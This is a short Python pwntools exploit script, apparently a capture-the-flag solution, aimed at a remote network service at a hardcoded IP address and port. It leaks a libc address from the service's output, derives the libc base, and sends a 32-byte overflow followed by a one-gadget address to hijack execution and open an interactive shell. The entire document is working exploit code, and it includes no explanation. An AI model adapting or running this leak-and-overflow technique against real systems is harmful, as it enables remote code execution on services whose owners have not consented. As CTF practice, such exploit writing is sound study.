from pwn import *

context.arch = 'amd64'

con = remote('153.120.129.186', 10000)
write_offset = 0x110140
system_offset = 0x04f440

con.recvregex('>> ')
con.sendline('A')
msg = con.recvregex('>> ')
libc_base_addr = unpack(msg[32:40]) - write_offset
print "[*] libc_base_addr = 0x%x" % unpack(msg[32:40])

payload = 'A' * 32
payload += pack(libc_base_addr + 0x4f322)  # one gadget
con.sendline(payload)

con.interactive()
